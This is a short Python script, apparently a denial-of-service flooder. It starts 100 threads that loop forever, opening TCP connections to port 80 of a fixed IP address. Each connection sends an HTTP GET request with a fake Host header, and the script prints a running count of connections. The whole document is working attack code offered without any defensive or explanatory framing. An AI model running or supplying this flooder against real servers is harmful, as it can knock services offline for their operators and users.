import threading
import socket

target = '192.168.1.1'
port = 80
false_ip = '182.21.20.32'

# To test and see the connections being made
already_connected = 0

# Function to send requests
def request_sender():
    flag = True
    while flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'))
            s.send(("Host: " + false_ip + "\r\n\r\n").encode('ascii'))
        except socket.error as e:
            print(f"Error encountered: {e}")
        finally:
            s.close()
            global already_connected
            already_connected += 1
            if already_connected % 500 == 0:
                print(already_connected)
                
# Starting multiple threads to send requests concurrently
for i in range(100):  
    thread = threading.Thread(target=request_sender)
    thread.start()
